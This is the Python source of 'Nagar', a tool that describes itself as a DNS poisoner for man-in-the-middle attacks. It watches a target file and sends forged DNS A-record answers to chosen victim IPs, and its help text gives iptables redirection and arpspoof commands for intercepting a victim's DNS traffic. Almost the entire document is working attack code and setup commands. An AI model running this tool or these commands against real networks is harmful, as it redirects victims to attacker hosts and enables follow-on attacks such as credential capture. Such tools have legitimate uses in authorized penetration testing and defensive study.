#!/usr/bin/env python
import argparse
import socket
import sys
import traceback
import socketserver
import threading
import logging
from scapy.all import *
import os


class TargetProcessor(threading.Thread):
    """This class is in charge of reading a target file continuously"""
    def __init__(self, target_file, target_dic):
        Thread.__init__(self)
        self.should_run = True
        self.filename = target_file
        self.target_list = []
        self.target_buffer = target_dic
        self.lastmtime = os.stat(self.filename).st_mtime
        self.readTargets()

    def readTargets(self):
        """Read the file with targets and load it into its dictionary"""
        try:
            fp = open(self.filename,'r')
            self.target_list = []
            for line in fp:
                if line.strip() != '':
                    self.target_list.append(line.strip())
        except Exception as e:
            logging.error('[-] Could not open file: %s' % self.filename)
            logging.debug(traceback.format_exc())


        if len(self.target_list) == 0:
            logging.info('[!] Warning: no targets available!')
        else:
            logging.debug('[D] Processing targets...')
            self.target_buffer.clear()
            for target in self.target_list:
                try:
                    parts = target.split(':')
                    key = parts[0] + parts[1]   # hostname + client_ip
                    value = parts[2]            # fake_ip
                    self.target_buffer[key] = value
                except Exception as e:
                    logging.error('[-] Could not process the target: %s' % target)
                    logging.debug(traceback.format_exc())

    def shutdown(self):
        self.should_run = False

    def run(self):
        """Thread that checks the modification time to read the file again accordingly"""
        while True and self.should_run:
            mtime = os.stat(self.filename).st_mtime
            if mtime > self.lastmtime:
                logging.info('[*] Target file was modified and it has to be read again...')
                self.lastmtime = mtime
                self.readTargets()
            time.sleep(1.0)


class DNSHelper():
    """Some useful DNS methods to support the main loop functionality"""
    # DNS server to query
    upstream_dns_server = ('', 0)
    # Entries of hostnames to be poisoned {hostname+client: fake_ip}
    poisoned_entries = {}
    # TTL for poisoned requests
    ttl_poisoned_entries = 0
    # Send a loop address for "No such name" answers
    loop_poisoning = False

    #poisoned_entries['pepe.google.com.127.0.0.1'] = '1.1.1.1'
    @staticmethod
    def getPoisonedEntry(hostname, client_ip):
        """Search for poisoned entries"""
        hostname = hostname.rstrip('.')
        logging.debug('[D] Searching a fake IP for %s requested by %s ...' % (hostname, client_ip))
        fake_ip = DNSHelper.poisoned_entries.get(hostname + client_ip)
        if fake_ip is not None:
            logging.info('[+] The client %s requested the hostname %s and will be poisoned with %s ...' % (client_ip, hostname, fake_ip))
            return fake_ip

    @staticmethod
    def sendDNSQuery(dns_query):
        """Used to send UDP packets to the DNS server directly using raw Sockets"""
        logging.debug('[D] Sending DGRAM to the DNS server ...')
        udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        udp_socket.sendto(dns_query, DNSHelper.upstream_dns_server)
        resp, addr = udp_socket.recvfrom(1024)
        return resp


class DNSServer(socketserver.DatagramRequestHandler):
    """DNS Server to forward non-poisoned requests"""

    def handle(self):
        """Handle UDP requests from clients"""

        # Get the data/socket sent by the client
        data = self.request[0].strip()
        socket = self.request[1]

        logging.debug('[D] Received query from "%s"' % self.client_address[0])

        try:
            dns_query = DNS(data)

            # If it is a Query type A, then check if it should be poisoned
            if dns_query.opcode == 0 and dnsqtypes[dns_query[DNSQR].qtype] == 'A':
                query_hostname = dns_query[DNSQR].qname.decode('ascii')

                # Check if its has a poisoned entry for this hostname
                fake_ip = DNSHelper.getPoisonedEntry(query_hostname, self.client_address[0])
    
                # If it has, then prepare and send a fake response
                if fake_ip is not None:
                    # Take the original Questions section
                    dns_qr = dns_query.qd
                    # Build the Answers section
                    dns_rr = DNSRR(rrname=str(query_hostname), type='A', rdata=fake_ip, ttl=DNSHelper.ttl_poisoned_entries)
                    # Build the DNS answer payload
                    dns_resp = DNS(id=dns_query.id, ancount=1, qr=1, qd=dns_qr, an=dns_rr)
                    logging.debug('[D] Sending the following poisoned response to the client:')
                    logging.debug(repr(dns_resp))
                    socket.sendto(bytes(dns_resp), self.client_address)
                    return

            # If it reached this point, then the DNS query should be forwarded
            logging.debug('[D] Forwarding query to the upstream DNS server')
            dns_resp = DNS(DNSHelper.sendDNSQuery(bytes(dns_query)))
            logging.debug('[D] Sending the following response to the client:')
            logging.debug(repr(dns_resp))

            # If the answer provided by the DNS server is 'No such name' and it was 
            # a query type A, then alert the attacker about it
            if dns_resp.rcode == 3 and dns_resp[DNSQR].qtype == 1:
                logging.info('[+] New unresolved hostname %s requested by %s' % (dns_resp[DNSQR].qname, self.client_address[0]))
                # If the attacker wants to reduce the TTL of the entry, send a loop address
                if DNSHelper.loop_poisoning:
                    logging.info('[*] Sending a fake response (127.0.0.1) to the unresolved hostname with a TTL of 120s ...')
                    # Take the original Questions section
                    dns_qr = dns_query.qd
                    # Build the Answers section
                    dns_rr = DNSRR(rrname=dns_query[DNSQR].qname.decode('ascii'), type='A', rdata='127.0.0.1', ttl=120)
                    # Build the DNS answer payload
                    dns_resp = DNS(id=dns_query.id, ancount=1, qr=1, qd=dns_qr, an=dns_rr)
                    logging.debug('[D] Sending the following loop poisoned response to the client:')
                    logging.debug(repr(dns_resp))
                    socket.sendto(bytes(dns_resp), self.client_address)
                    return

            # Sending the UDP response
            socket.sendto(bytes(dns_resp), self.client_address)

        except Exception as e:
            logging.debug('[D] Invalid data from: "%s" (%s)' % (self.client_address[0], data))
            logging.debug(str(e))
            logging.debug(traceback.format_exc())


if __name__ == "__main__":
    description = """
Nagar v20181105 - Coded by Bransh

    Nagar is a DNS Poisoner for MiTM attacks.

    Think about this tool as a complement to Responder when you are doing a MiTM between a victim 
    and the DNS server. This way, you have the chance to craft a response and make the victim think a 
    hostname actually exits when it does not. The fake answer will make the victim believe that what 
    s/he is looking for is the attacker's IP and you will have the chance to perform other attacks 
    against the particular protocol used by the victim after receiving the fake answer (e.g. SMB).

    Notes: 
        * Nagar will dynamically read FQDN targets, to be poisoned, from a target file containing lines 
          following the pattern: FQDN:VICTIM_IP:FAKE_IP
          You can add new targets at will without needing to restart the tool.

        * Nagar will use a TTL of 10 minutes by default, although you can modify this.
        
        * "No such name" answers will be cached by around 15 minutes on Windows. However, you can speed it 
          up by making Nagar response with a fake IP pointing to 127.0.0.1 with a TTL of 2 minutes.

"""
    epilog_help="""
MiTM HELP:
    [+] In a [TARGET] <---> [ATTACKER] <---> [DNS] scenario, make sure to:
        1. iptables -F; iptables -t nat -F
        2. iptables -t nat -A PREROUTING -p UDP -s TARGET -d DNS_SERVER --dport 53 -j DNAT --to-destination ATTACKER:9053
        3. arpspoof -i IFACE -t TARGET DNS_SERVER

    [+] In a [TARGET] <---> [ATTACKER] <---> [GATEWAY] <---> [DNS] scenario, make sure to:
        1. iptables -F; iptables -t nat -F
        2. echo '1' > /proc/sys/net/ipv4/ip_forward
        3. iptables -t nat -A POSTROUTING -o IFACE -j MASQUERADE
        2. iptables -t nat -A PREROUTING -p UDP -s TARGET -d DNS_SERVER --dport 53 -j DNAT --to-destination ATTACKER:9053
        5. arpspoof -i IFACE -t TARGET -r GATEWAY
--
"""

    # Main Arguments
    parser = argparse.ArgumentParser(description=description, epilog=epilog_help, 
                                     formatter_class=argparse.RawTextHelpFormatter)

    parser.add_argument('-s', '--dns-server', required=True, dest="dns_server", type=str, help="Upstream DNS server to forward queries")
    parser.add_argument('-p', '-port', required=False, dest="port", action='store', type=int, default=5353, help='DNS service port (default 5353)')
    parser.add_argument('-f', '-file', required=False, dest="target_file", action='store', type=str, default='targets.txt', help='Specify the targets filename to read from (default targets.txt)')
    parser.add_argument('-t', '-ttl', required=False, dest="ttl", action='store', type=int, default=600, help='Specify the TTL (in seconds) for poisoned answers (default 600 seconds)')
    parser.add_argument('-l', '-loop', required=False, dest="loop", action='store_true', default=False, help='Enable this if you want to reduce the flush time for "No such name" records')
    parser.add_argument('-d', '-debug', required=False, dest="debug", action='store_true', help='Turn DEBUG output ON')
    options = parser.parse_args()

    # Logs configuration
    LOGS_FILE = 'nagar.log'
    
    fileLogFormatter = logging.Formatter("%(asctime)s [%(threadName)-12.12s] [%(levelname)-5.5s]  %(message)s")
    consoleLogFormatter = logging.Formatter("%(message)s")
    rootLogger = logging.getLogger()
    
    fileHandler = logging.FileHandler(LOGS_FILE)
    fileHandler.setFormatter(fileLogFormatter)
    
    consoleHandler = logging.StreamHandler()
    consoleHandler.setFormatter(consoleLogFormatter)

    rootLogger.addHandler(fileHandler)
    rootLogger.addHandler(consoleHandler)

    if options.debug is True:
        rootLogger.setLevel(logging.DEBUG)
    else:
        rootLogger.setLevel(logging.INFO)
        logging.getLogger('scapy.runtime').setLevel(logging.ERROR)

    # Set the upstream DNS server
    logging.info('[*] Will use the following DNS server: ' + options.dns_server + ' ...')
    DNSHelper.upstream_dns_server = (options.dns_server, 53)
    DNSHelper.ttl_poisoned_entries = options.ttl
    DNSHelper.loop_poisoning = options.loop

    # Prepare the target watching
    target_processor = TargetProcessor(options.target_file, DNSHelper.poisoned_entries)

    server_address = ('0.0.0.0', options.port)
    udp_server = socketserver.ThreadingUDPServer(server_address, DNSServer)

    try:
        logging.info('[*] Starting the file watcher ...')
        target_processor.start()
        logging.info('[*] Starting the DNS server on port %s:%s ...' % ('0.0.0.0', str(options.port)))
        udp_server.serve_forever()
    except KeyboardInterrupt:
        logging.info('')
        logging.info('[*] Sending kill to the target processor thread ...')
        target_processor.shutdown()
        logging.info('[*] Sending kill to the DNS server thread ...')
        udp_server.shutdown()

# TODO
# []
